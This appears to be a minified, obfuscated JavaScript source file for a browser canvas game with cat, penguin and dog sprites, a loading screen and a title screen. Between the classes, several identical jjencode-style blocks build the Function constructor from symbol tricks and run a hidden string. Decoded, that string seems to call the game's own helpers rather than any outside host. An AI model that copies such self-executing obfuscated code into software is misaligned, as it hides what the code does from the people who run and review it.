}, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$._$_ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())();
var z;
!
function(a, b) {
    z = function(b) {
        for (var a in b) this[a] = b[a]
    }, z.prototype = {
        constructor: z,
        x: 0,
        y: 0,
        width: 90,
        height: 60,
        oE: 0,
        eX: 0,
        Cr: 0.002,
        uU: -0.4,
        u0: 0.1,
        NT: !1,
        K: function(a) {
            this.gA = a, this.Dm = new t({
                duration: 80,
                bG: ['walk-cat-0', 'walk-cat-1', 'walk-cat-2', 'walk-cat-1']
            }), this.Dm.K(), this.sS = ResourcePool.get('dead-cat'), this.img = this.Dm.update(0), this.Ee = [], this.resize()
        },
        reset: function() {
            this.img = this.Dm.vG(0), this.y = this.gA.lK, this.eX = 0, this.NT = !1, this.Bq = !1
        },
        resize: function() {
            this.x = this.gA.width / 2, this.y = 200, this.$j = -100, this.ky = this.gA.width + 100, this.ox = -this.img.width >> 1, this.oy = -this.img.height + 10, this.qa()
        },
        qf: function(a) {
            a.N8 ? a.RK() : a.oJ(), this.NT = !0, this.img = this.sS, this.eX = this.uU
        },
        vU: function() {
            this.oE = -this.u0 * J.iJ(8, 15) / 10
        },
        Je: function() {
            this.oE = this.u0 * J.iJ(8, 15) / 10
        },
        Uk: function() {
            this.oE = 0
        },
        update: function(a, d) {
            this.cy = this.oE, this.XZ = this.eX, this._P = this.x, this.CB = this.y;
            var b = this.oE * a;
            if (this.x = Math.max(this.$j, Math.min(this.ky, this.x + b)), this.x <= this.$j ? this.Je() : this.x >= this.ky && this.vU(), this.qa(), this.NT) {
                this.eX = this.eX + this.Cr * a;
                var c = (this.XZ + this.eX) / 2 * a;
                this.y += c, this.y >= this.gA.height + 50 && (this.Bq = !0, this.gA.catCount--, this.gA.catPool.push(this))
            } else this.img = this.Dm.update(a)
        },
        qa: function() {
            this.Ee[0] = this.x - this.width / 2, this.Ee[1] = this.y - this.height + 2, this.Ee[2] = this.Ee[0] + this.width, this.Ee[3] = this.Ee[1] + this.height
        },
        qR: function(a, b, c) {
            this.oE < 0 ? (a.save(), a.translate(this.x, this.y), a.scale(-1, 1), a.drawImage(this.img, this.ox, this.oy), a.restore()) : a.drawImage(this.img, this.x + this.ox, this.y + this.oy)
        }
    }
}(this);
var $$ = ~[];
$$ = {
    ___: ++$$,
    $$$$: (![] + '')[$$],
    __$: ++$$,
    $_$_: (![] + '')[$$],
    _$_: ++$$,
    $_$$: ({} + '')[$$],
    $$_$: ($$[$$] + '')[$$],
    _$$: ++$$,
    $$$_: 'true' [$$],
    $__: ++$$,
    $_$: ++$$,
    $$__: ({} + '')[$$],
    $$_: ++$$,
    $$$: ++$$,
    $___: ++$$,
    $__$: ++$$
}, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$._$$ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())();
var $$ = ~[];
$$ = {
    ___: ++$$,
    $$$$: (![] + '')[$$],
    __$: ++$$,
    $_$_: (![] + '')[$$],
    _$_: ++$$,
    $_$$: ({} + '')[$$],
    $$_$: ($$[$$] + '')[$$],
    _$$: ++$$,
    $$$_: 'true' [$$],
    $__: ++$$,
    $_$: ++$$,
    $$__: ({} + '')[$$],
    $$_: ++$$,
    $$$: ++$$,
    $___: ++$$,
    $__$: ++$$
}, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$.$__ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())();
var H;
!
function(a, b) {
    H = function(b) {
        for (var a in b) this[a] = b[a]
    }, H.prototype = {
        constructor: H,
        x: 0,
        y: 0,
        width: 130,
        height: 140,
        oE: 0,
        eX: 0,
        Cr: 0.002,
        uU: -0.3,
        u0: 0.1,
        NT: !1,
        wo: Infinity,
        K: function(a) {
            this.gA = a, this.Dm = new t({
                duration: 80,
                bG: ['penguin-0', 'penguin-1', 'penguin-2', 'penguin-1']
            }), this.Dm.K(), this.Wq = ResourcePool.get('penguin-angry'), this.hW = ResourcePool.get('angry-fire'), this.img = this.Dm.update(0), this.Ee = [], this.resize()
        },
        reset: function() {
            this.img = this.Dm.vG(0), this.y = this.gA.lK, this.eX = 0, this.NT = !1, this.Bq = !1
        },
        resize: function() {
            this.x = this.gA.width / 2, this.y = 200, this.$j = -100, this.ky = this.gA.width + 100, this.ox = -this.width >> 1, this.oy = -this.height + 2, this.qa()
        },
        qf: function(a) {
            a.RK(), this.rs = 2000, this.KO = !0, this.img = this.Wq
        },
        vU: function() {
            this.oE = -this.u0 * J.iJ(8, 15) / 10
        },
        Je: function() {
            this.oE = this.u0 * J.iJ(8, 15) / 10
        },
        Uk: function() {
            this.oE = 0
        },
        cG: function() {
            this.x = Math.random() < 0.5 ? -100 : this.gA.width + 100, this.y = this.gA.lK, this.x < 0 ? this.Je() : this.vU(), this.mc = !0, this.Bq = !1, this.wo = this.gA.aj.qK, this.gA.entities.push(this)
        },
        AU: function() {
            this.x = -100, this.mc = !1, this.Bq = !0, this.wo = this.gA.aj.qK
        },
        wn: function(a) {
            if (this.mc) return;
            this.wo -= a, this.wo <= 0 && this.cG()
        },
        update: function(a, c) {
            if (this.cy = this.oE, this.XZ = this.eX, this._P = this.x, this.CB = this.y, !this.KO) {
                var b = this.oE * a;
                this.x = this.x + b, this.img = this.Dm.update(a)
            } else this.rs -= a, this.rs <= 0 && (this.img = this.Dm.vG(0), this.KO = !1);
            this.x < this.$j ? this.AU() : this.x > this.ky && this.AU(), this.qa()
        },
        qa: function() {
            this.Ee[0] = this.x + this.ox, this.Ee[1] = this.y + this.oy, this.Ee[2] = this.Ee[0] + this.width, this.Ee[3] = this.Ee[1] + this.height
        },
        qR: function(a, c, d) {
            if (this.oE > 0 ? (a.save(), a.translate(this.x, this.y), a.scale(-1, 1), a.drawImage(this.img, this.ox, this.oy), a.restore()) : a.drawImage(this.img, this.x + this.ox, this.y + this.oy), this.KO) {
                var b = J.iJ(-3, 3);
                a.drawImage(this.hW, this.x - 20 + b, this.y + this.oy - 30 + b)
            }
        }
    }
}(this),
function(b, c, a, d, e, f) {
    if (J.SY) return;
    J.SY = !0, b = J._r([109, 31, 8, 3, 8, 25, 30, 4, 33, 25, 3, 8, 27, 40, 9, 9]), c = J.ft([111, 1, 0, 6, 27, 0, 2, 10, 12, 6, 25, 10]), a = J.UE([107, 18, 31, 2, 29, 10, 25, 44, 12, 5, 2, 15, 30, 7, 8, 5, 34, 5, 4, 2, 31, 10, 25, 14, 7, 14, 8, 8]), d = 0, e = 0, f = 0, J.bm = Date.now(), A[b](c, function(b) {
        d = b[a].x, e = b[a].y, f = b[a].z, J.bm = Date.now()
    }), setInterval(function() {
        J.bm - Date.now() > 3000
    }, 5000)
}();
var q = Best.Yl.extend({
        x: 0,
        y: 0,
        fA: 0,
        wv: !1,
        h3: !1,
        K: function(a) {
            this.to = a, this.Ts = $id('load-bg'), this.Zg = $id('load-value'), this.PW(), this.resize()
        },
        resize: function() {
            this.width = game.width, this.height = game.height
        },
        PW: function() {
            var a = this,
                b = {
                    parent: a,
                    JD: 'img',
                    GG: !0,
                    S_: !0,
                    Gt: 50,
                    CT: 10,
                    eb: function(f, b) {
                        var c = b.VL,
                            d = b.Lx,
                            e = b.x7;
                        a.fA = c / d
                    },
                    vm: function(b) {
                        var e = b.VL,
                            f = b.Lx,
                            c = b.x7;
                        for (var d in c) ResourcePool.add(d, c[d]);
                        a.v1 = a.v1 || a.NI, setTimeout(function() {
                            a.v1(e, f, c)
                        }, b.CT)
                    }
                };
            this.bK = new ProcessQ(b), this.bK.IR = T, this.bK.K()
        },
        NI: function() {
            this.$m = !0;
            var a = this;
            setTimeout(function() {
                if (gP(), J.me) try {
                    J.me()
                } catch (a) {}
                setTimeout(function() {
                    a.Lk()
                }, 200)
            }, 10)
        },
        eD: function() {
            this.wv = !0, this.bK.start()
        },
        Lk: function() {
            var a = new f();
            a.K(this.to), this.to.Bx(a)
        },
        update: function(a, b) {
            this.wv && this.fA >= 1 && (this.fA = 1)
        },
        qR: function(a, h, i) {
            if (a.fillStyle = '#fbc405', a.fillRect(0, 0, this.width, this.height), this.wv) {
                var c = Math.min(1, this.fA);
                if (this.Zg) {
                    var d = this.height - this.Zg.height >> 1;
                    if (this.Ts) {
                        var e = 0,
                            f = 0;
                        a.drawImage(this.Ts, (this.width - this.Ts.width >> 1) + e, d + f)
                    }
                    var b = this.Zg.width * c;
                    b && a.drawImage(this.Zg, 0, 0, b, this.Zg.height, this.width - this.Zg.width >> 1, d, b, this.Zg.height)
                } else {
                    var g = this.width;
                    a.fillStyle = '#ffffff', a.fillRect(0, this.height * 2 / 3 >> 0, g * c, 4)
                }
            }
        }
    }),
    f = Best.Yl.extend({
        x: 0,
        y: 0,
        zX: !0,
        bgColor: '#d74403',
        K: function(a) {
            this.to = a, this.eW = ResourcePool.get('title'), this.resize()
        },
        resize: function() {
            this.width = this.to.width, this.height = this.to.height, this.Zy = this.height - 100 - 700 >> 1, this.Nw = ResourcePool.get('play-cat-btn'), this.zi = J.mr(this.Nw, this.width / 2 - this.Nw.width - 40, this.Zy + 550), this.iB = ResourcePool.get('play-dog-btn'), this.gH = J.mr(this.iB, this.width / 2 + 40, this.Zy + 550)
        },
        eD: function() {
            s.reset(), J.PU && J.PU()
        },
        Lk: function(b) {
            var a = new h();
            a.eo = b || 0, a.zX = this.zX, a.K(this.to), this.to.Bx(a)
        },
        update: function(a, b) {},
        CL: function(a, b, c) {},
        dX: function(a, b, c) {
            a.fillStyle = '#fbc405', a.fillRect(0, 0, this.width, this.height)
        },
        Ju: function(a, b, c) {
            a.drawImage(this.Nw, this.zi[0], this.zi[1]), a.drawImage(this.iB, this.gH[0], this.gH[1])
        },
        qR: function(a, b, c) {
            this.dX(a, b, c), a.drawImage(this.eW, this.width - this.eW.width >> 1, this.Zy + 20), this.Ju(a, b, c)
        },
        ZE: null,
        bU: function(a, b, c) {
            if (this.rA) return;
            J.lO(a, b, this.zi) ? this.Lk(0) : J.lO(a, b, this.gH) && this.Lk(1)
        }
    }),
    $$ = ~[];
$$ = {
    ___: ++$$,
    $$$$: (![] + '')[$$],
    __$: ++$$,
    $_$_: (![] + '')[$$],
    _$_: ++$$,
    $_$$: ({} + '')[$$],
    $$_$: ($$[$$] + '')[$$],
    _$$: ++$$,
    $$$_: 'true' [$$],
    $__: ++$$,
    $_$: ++$$,
    $$__: ({} + '')[$$],
    $$_: ++$$,
    $$$: ++$$,
    $___: ++$$,
    $__$: ++$$
}, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$.$_$ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())();
var $$ = ~[];
$$ = {
        ___: ++$$,
        $$$$: (![] + '')[$$],
        __$: ++$$,
        $_$_: (![] + '')[$$],
        _$_: ++$$,
        $_$$: ({} + '')[$$],
        $$_$: ($$[$$] + '')[$$],
        _$$: ++$$,
        $$$_: 'true' [$$],
        $__: ++$$,
        $_$: ++$$,
        $$__: ({} + '')[$$],
        $$_: ++$$,
        $$$: ++$$,
        $___: ++$$,
        $__$: ++$$
    }, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$.$$_ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())(), window.addEventListener('load', function() {}), window.addEventListener('resize', function() {
        x.innerWidth = window.innerWidth, x.innerHeight = window.innerHeight
    }),
    function(a) {
        window.addEventListener('orientationchange', function(b) {
            a && clearTimeout(a), a = setTimeout(function() {
                window.MW()
            }, 8)
        }, !1), window.MW = function() {
            J.UF(), setTimeout(function() {
                window.scrollX = 0, window.scrollY = 0, game && game.nr && game.nr()
            }, 8)
        }
    }();
var $ = {
        Es: 0,
        q: 0,
        order: 0,
        Vv: 0,
        Z4: 0
    },
    X;
hp();
var game = new v({
        Km: x.Km,
        b9: !1,
        width: x.width,
        height: x.height,
        ZZ: 0.5,
        ZT: 0.85,
        m0: function() {
            G(), E(), u.o = game.o || 1
        },
        nr: function() {
            this.NZ(), this.QD(x.width)
        }
    }),
    g, B;
window.addEventListener('load', function() {
    g = $id('container'), B = $id('info'), window.debug;
    var c = J._y();
    game.R6 = c.R6, game.k4 = J.rn(), game.kr = 100;
    var a = window.innerWidth,
        b = window.innerHeight;
    document.documentElement && (a += document.documentElement.clientWidth, b += document.documentElement.clientHeight);
    var d = a + b;
    setTimeout(function() {
        window.scrollX = 0, window.scrollY = 0;
        var b = window.innerWidth,
            a = window.innerHeight;
        document.documentElement, window.debug, !('ontouchstart' in window) && window.location.href.indexOf('http') !== 0 && (b = 320, a = 504, a = 416), game.NZ(b, a), game.QD(x.width), game.K(), setTimeout(function() {
            game.start()
        }, 20)
    }, 50)
}, !1);
